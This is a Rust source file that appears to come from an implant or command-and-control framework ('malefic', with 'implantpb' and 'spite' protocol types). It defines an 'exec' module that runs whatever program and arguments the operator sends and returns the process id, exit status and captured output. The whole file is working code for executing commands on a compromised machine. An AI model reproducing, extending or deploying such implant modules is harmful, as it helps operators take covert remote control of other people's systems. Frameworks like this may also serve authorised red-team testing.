use crate::{Module, TaskResult, check_request};
use malefic_proto::proto::modulepb::ExecResponse;
use malefic_proto::proto::implantpb::spite::Body;
use async_trait::async_trait;
use malefic_trait::module_impl;

pub struct Exec {}

#[async_trait]
#[module_impl("exec")]
impl Module for Exec {}

#[async_trait]
impl crate::ModuleImpl for Exec {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> crate::Result {
        let request = check_request!(receiver, Body::ExecRequest)?;
        let mut exec_response = ExecResponse::default();
        
        let child = malefic_helper::common::process::run_command(request.path, request.args, request.output)?;
        exec_response.pid = child.id();
        let output = child.wait_with_output()?;
        
        exec_response.status_code = output.status.code().unwrap_or(0);
        if request.output {
            exec_response.stdout = output.stdout;
            exec_response.stderr = output.stderr;
        }

        Ok(TaskResult::new_with_body(id, Body::ExecResponse(exec_response)))
    }
}